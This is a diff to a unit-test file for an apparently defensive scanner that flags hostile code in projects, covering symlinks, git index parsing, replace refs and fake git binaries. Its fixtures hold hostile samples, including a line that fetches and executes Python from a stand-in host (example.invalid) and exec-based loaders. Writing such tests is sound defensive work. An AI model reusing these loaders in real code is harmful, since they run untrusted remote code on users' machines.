@@ -8,6 +8,7 @@ import base64
 import hashlib
 import json
 import os
+import struct
 import subprocess
 import sys
 import tempfile
@@ -42,6 +43,20 @@ def go():
     exec(urllib.request.urlopen("http://example.invalid/m.py").read())
 """
 PE_B64 = base64.b64encode(b"MZ\x90\x00" + bytes(range(256)) * 20).decode()
+
+
+def git_index(*paths, version=2, extension=b""):
+    """A real git index holding these paths (no file data): what `git add` would write."""
+    out, prev = b"DIRC" + struct.pack(">II", version, len(paths)), b""
+    for path in sorted(x.encode() for x in paths):
+        head = b"\0" * 60 + struct.pack(">H", min(len(path), 0xFFF))
+        if version == 4:  # each path is stored as what it shares with the one before
+            common = len(os.path.commonprefix([prev, path]))
+            out += head + bytes([len(prev) - common]) + path[common:] + b"\0"
+        else:
+            out += head + path + b"\0" * (8 - (62 + len(path)) % 8)
+        prev = path
+    return out + extension + b"\0" * 20
 
 
 class Case(unittest.TestCase):
@@ -211,7 +226,7 @@ class ReviewFindings(Case):
 
     def test_real_install_in_a_git_repo_is_skipped(self):
         self.put("venv/evil.py", PLAIN)
-        self.put(".git/index", b"DIRC\x00\x00good.py\x00")
+        self.put(".git/index", git_index("good.py"))
         self.put("good.py", "x=1\n")
         out = self.scan(0)
         self.assertIn("venv", out["skipped"])
@@ -222,7 +237,7 @@ class Worktrees(Case):
     checked when work happens there. Only a copy git registered on both sides is skipped."""
 
     def worktree(self, rel="wt/a", name="a", marker=None, back=None):
-        self.put(".git/index", b"DIRC\x00\x00good.py\x00")
+        self.put(".git/index", git_index("good.py"))
         self.put("good.py", "x=1\n")
         self.put(rel + "/evil.py", PLAIN)
         entry = os.path.join(self.dir, ".git", "worktrees", name)
@@ -772,6 +787,35 @@ class StaleCopies(Case):
         self.mine()
         self.assertIn(("pkg/client.py", "runs-on-import"), self.stops(self.scan(1)))
 
+    def test_a_replaced_commit_cannot_make_a_changed_file_an_old_copy(self):
+        # third review: with git's replace refs honoured, a planted ref rewrites what "the commit this
+        # branch started from" holds, and a file changed since would pass as an old copy
+        self.the_case()
+        fork = self.g("merge-base", "feature", "main")
+        with open(os.path.join(self.wt, "scripts", "scan_gitleaks.py"), "w") as f:
+            f.write('"""never closed, and changed on the branch\n')
+        self.g("add", "-A", cwd=self.wt)
+        planted = self.g("commit-tree", self.g("write-tree", cwd=self.wt), "-m", "planted")
+        self.g("replace", fork, planted)  # the fork commit now appears to hold the changed file
+        self.tool("--mine", folder=self.wt)
+        out = self.scan_wt(2)
+        self.assertEqual(out["not_checked"], ["scripts/scan_gitleaks.py"])
+
+    def test_a_git_that_is_a_link_into_the_project_is_not_used(self):
+        self.the_case()
+        marker = os.path.join(self.tmp.name, "project-git-used")
+        inside = os.path.join(self.wt, "tools-git")
+        with open(inside, "w") as f:
+            f.write(f"#!/bin/sh\ntouch {marker}\nexit 1\n")
+        os.chmod(inside, 0o755)
+        fake = os.path.join(self.tmp.name, "bin")
+        os.mkdir(fake)
+        os.symlink(inside, os.path.join(fake, "git"))
+        self.tool("--mine", folder=self.wt)
+        self.env = dict(os.environ, PATH=fake + os.pathsep + os.environ["PATH"])
+        self.scan_wt()
+        self.assertFalse(os.path.exists(marker), "a git reached through a link into the project was run")
+
     def test_an_old_git_is_not_trusted_with_the_lookup(self):
         self.the_case()
         fake = os.path.join(self.tmp.name, "oldgit")
@@ -861,11 +905,12 @@ class UnreadPaths(Case):
     PAYLOAD = "import os\nos.system('true')\n"
     LOADER = 'exec(open("%s").read())\n'
 
-    def test_a_py_name_that_is_a_link_to_an_unread_file_stops(self):
-        self.put("README.txt", self.PAYLOAD)
+    def test_a_py_name_that_is_a_link_is_judged_by_what_it_points_at(self):
+        # the link stays inside the project, so it is read through: the payload is found there
+        self.put("README.txt", PLAIN)
         os.symlink("README.txt", os.path.join(self.dir, "helper.py"))
         self.put("setup.py", self.LOADER % "helper.py")
-        self.assertIn(("setup.py", "read-then-run"), self.stops(self.scan(1)))
+        self.assertIn(("helper.py", "decode-then-run"), self.stops(self.scan(1)))
 
     def test_a_py_file_inside_a_git_folder_is_not_read_so_loading_it_stops(self):
         self.put(".git/p.py", self.PAYLOAD)
@@ -873,7 +918,7 @@ class UnreadPaths(Case):
         self.assertIn(("setup.py", "read-then-run"), self.stops(self.scan(1)))
 
     def test_a_py_file_in_a_skipped_packages_folder_is_not_read_so_loading_it_stops(self):
-        self.put(".git/index", "junk")
+        self.put(".git/index", git_index("setup.py"))  # a real index that does not list the folder
         self.put("node_modules/p.py", self.PAYLOAD)
         self.put("setup.py", self.LOADER % "node_modules/p.py")
         self.assertIn(("setup.py", "read-then-run"), self.stops(self.scan(1)))
@@ -1044,25 +1089,145 @@ class Honesty(Case):
         self.put("b.py", "y=" + "-" * 200000 + "1\n")
         self.assertIn(self.scan()["status"], ("clear", "incomplete"))
 
-    def test_symlink_is_not_followed(self):
+    def test_a_code_file_linked_to_outside_the_project_is_never_opened_and_is_said(self):
+        # the project did not bring that file, so it is not read; the report says the link is there
         outside = os.path.join(self.tmp.name, "outside.py")
         with open(outside, "w") as f:
             f.write(PLAIN)
         os.symlink(outside, os.path.join(self.dir, "link.py"))
-        self.assertEqual(self.scan(0)["stop"], [])
+        out = self.scan(0)
+        self.assertEqual(out["stop"], [])
+        self.assertEqual([(n["file"], n["signal"]) for n in out["notes"]], [("link.py", "link-not-followed")])
 
     def test_installed_folders_are_skipped_and_said(self):
         self.put("node_modules/x/a.py", PLAIN)
         self.put("good.py", "x=1\n")
-        self.put(".git/index", b"DIRC\x00\x00good.py\x00")
+        self.put(".git/index", git_index("good.py"))
         out = self.scan(0)
         self.assertIn("node_modules", out["skipped"])
 
     def test_committed_node_modules_is_scanned(self):
         # A carrier committed under an "installed" folder name must not get a free pass.
         self.put("node_modules/x/a.py", PLAIN)
-        self.put(".git/index", b"DIRC\x00\x00node_modules/x/a.py\x00")
+        self.put(".git/index", git_index("node_modules/x/a.py"))
         self.assertIn(("node_modules/x/a.py", "decode-then-run"), self.stops(self.scan(1)))
+
+
+class Links(Case):
+    """Second review of v1.65.1: a link that stands in for a code file, or for a folder, was skipped
+    without a word, so a conftest.py that is a link ran unseen."""
+
+    def test_a_linked_conftest_is_read_through_when_its_target_is_in_the_project(self):
+        self.put("notes.txt", PLAIN)
+        os.symlink("notes.txt", os.path.join(self.dir, "conftest.py"))
+        self.assertIn(("conftest.py", "decode-then-run"), self.stops(self.scan(1)))
+
+    def test_a_linked_module_that_another_file_imports_is_read_through(self):
+        self.put("data.txt", PLAIN)
+        os.symlink("data.txt", os.path.join(self.dir, "helper.py"))
+        self.put("setup.py", "import helper\n")
+        self.assertIn(("helper.py", "decode-then-run"), self.stops(self.scan(1)))
+
+    def test_a_link_that_is_not_code_is_left_alone(self):
+        self.put("good.py", "x = 1\n")
+        os.symlink("/etc/hosts", os.path.join(self.dir, "hosts-link.txt"))
+        os.symlink("nowhere.py", os.path.join(self.dir, "dangling.py"))  # nothing there to run
+        self.assertEqual(self.scan(0)["not_checked"], [])
+
+    def test_a_folder_linked_to_outside_the_project_is_not_walked_and_does_not_stop_the_run(self):
+        # a tool's cache is the usual case (a Terraform provider folder); it is not the project's code
+        outside = os.path.join(self.tmp.name, "cache")
+        os.mkdir(outside)
+        with open(os.path.join(outside, "conftest.py"), "w") as f:
+            f.write(PLAIN)
+        self.put("good.py", "x = 1\n")
+        os.symlink(outside, os.path.join(self.dir, "providers"))
+        out = self.scan(0)
+        self.assertEqual((out["stop"], out["not_checked"], out["checked"]), ([], [], 1))
+
+    def test_a_named_file_must_be_one_this_tool_read_wherever_python_might_find_it(self):
+        # tests/helpers.py is harmless and was read; helpers.py at the top is a link to somewhere
+        # else. Run from the top folder, open("helpers.py") gets the link.
+        outside = os.path.join(self.tmp.name, "payload.py")
+        with open(outside, "w") as f:
+            f.write(PLAIN)
+        self.put("tests/conftest.py", 'exec(open("helpers.py").read())\n')
+        self.put("tests/helpers.py", "x = 1\n")
+        os.symlink(outside, os.path.join(self.dir, "helpers.py"))
+        self.mine()
+        self.assertIn(("tests/conftest.py", "read-then-run"), self.stops(self.scan(1)))
+
+    def test_a_named_path_that_climbs_out_of_a_folder_is_not_trusted(self):
+        self.put("p.py", "x = 1\n")
+        self.put("lib/keep.py", "x = 1\n")
+        self.put("setup.py", 'exec(open("lib/../p.py").read())\n')
+        self.assertIn(("setup.py", "read-then-run"), self.stops(self.scan(1)))
+
+
+class InstalledFolders(Case):
+    """Third review, 2026-11-17: a packages folder is skipped only when a git index that can be read
+    exactly does not list it. The old test looked for the folder's name anywhere in the file."""
+
+    def scanned(self):
+        return ("node_modules/x/a.py", "decode-then-run") in self.stops(self.scan())
+
+    def setUp(self):
+        super().setUp()
+        self.put("node_modules/x/a.py", PLAIN)
+        self.put("good.py", "x=1\n")
+
+    def test_an_index_that_is_not_one_skips_nothing(self):
+        self.put(".git/index", "junk")
+        self.assertTrue(self.scanned())
+
+    def test_a_name_in_the_index_file_is_not_a_listing(self):
+        self.put(".git/index", b"DIRC\x00\x00good.py\x00")  # the old fake: not a readable index
+        self.assertTrue(self.scanned())
+
+    def test_a_compressed_index_with_a_decoy_name_still_lists_the_folder(self):
+        # version 4 stores "node_modules/x/a.py" after "node_modules.txt" as a shared prefix plus
+        # "/x/a.py", so the text "node_modules/" never appears in the file
+        raw = git_index("node_modules.txt", "node_modules/x/a.py", "good.py", version=4)
+        self.assertNotIn(b"node_modules/", raw)
+        self.put(".git/index", raw)
+        self.assertTrue(self.scanned())
+
+    def test_each_index_version_lists_and_skips_correctly(self):
+        for version in (2, 3, 4):
+            with self.subTest(version):
+                self.put(".git/index", git_index("good.py", "src/node_modules_notes.py", version=version))
+                self.assertIn("node_modules", self.scan(0)["skipped"])
+                self.put(".git/index", git_index("good.py", "node_modules/x/a.py", version=version))
+                self.assertTrue(self.scanned())
+
+    def test_an_index_with_anything_left_over_is_not_trusted(self):
+        self.put(".git/index", git_index("good.py") + b"more")
+        self.assertTrue(self.scanned())
+
+    def test_a_split_index_is_not_trusted(self):
+        # with a split index most paths live in another file, so this one proves nothing
+        link = b"link" + struct.pack(">I", 20) + b"\0" * 20
+        self.put(".git/index", git_index("good.py", extension=link))
+        self.assertTrue(self.scanned())
+
+    def test_git_itself_agrees(self):
+        import shutil
+        if not shutil.which("git"):
+            self.skipTest("no git")
+        env = dict(os.environ, GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
+        def g(*args):
+            subprocess.run(["git", "-C", self.dir, *args], check=True, capture_output=True, env=env)
+        g("init", "-q")
+        g("add", "good.py")
+        for version in ("2", "4"):
+            with self.subTest(version):
+                g("update-index", "--index-version", version)
+                self.assertIn("node_modules", self.scan(0)["skipped"])
+        g("add", "-f", "node_modules")
+        for version in ("2", "4"):
+            with self.subTest("tracked " + version):
+                g("update-index", "--index-version", version)
+                self.assertTrue(self.scanned())
 
 
 class Clearing(Case):
@@ -1135,12 +1300,14 @@ class Wiring(unittest.TestCase):
         with tempfile.TemporaryDirectory() as home:
             os.makedirs(os.path.join(home, ".claude", "make-it"))
             os.symlink(os.path.dirname(SCRIPT), os.path.join(home, ".claude", "make-it", "scripts"))
-            open(os.path.join(home, "a.py"), "w").write("x=1\n")
+            project = os.path.join(home, "project")  # not the home itself: its link to the script
+            os.mkdir(project)                          # leaves the folder, which is never a pass
+            open(os.path.join(project, "a.py"), "w").write("x=1\n")
             shell_path = subprocess.run(["sh", "-c", f"command -v {shell}"], capture_output=True, text=True).stdout.strip()
             if not shell_path:
                 self.skipTest(f"{shell} not installed")
             env = {"HOME": home, "PATH": path}
-            return subprocess.run([shell_path, "-c", block], cwd=home, env=env, capture_output=True, text=True).stdout
+            return subprocess.run([shell_path, "-c", block], cwd=project, env=env, capture_output=True, text=True).stdout
 
     def test_snippet_with_no_python_says_could_not_finish(self):
         for shell in ("bash", "zsh"):
@@ -1183,6 +1350,10 @@ class Wiring(unittest.TestCase):
         self.assertIn("exit 3", self.read(".claude/make-it/references/build-standards.md"))
         for gone in ("type the path", "type the folder", "typed the folder", "they typed", "I'll let through the files listed"):
             self.assertNotIn(gone, ref, gone)  # no typed confirmation, and no one-click clear of every file
+
+    def test_git_is_told_to_run_no_hooks(self):
+        # no command the check runs fires a hook today, so this can only be pinned in the source
+        self.assertIn('"core.hooksPath=" + os.devnull', self.read(".claude/make-it/scripts/hostile-code-check.py"))
 
     def test_a_file_this_python_cannot_parse_is_never_a_quiet_pass(self):
         # review 2026-11-17: newer syntax fails to parse here but runs where the project runs, and the
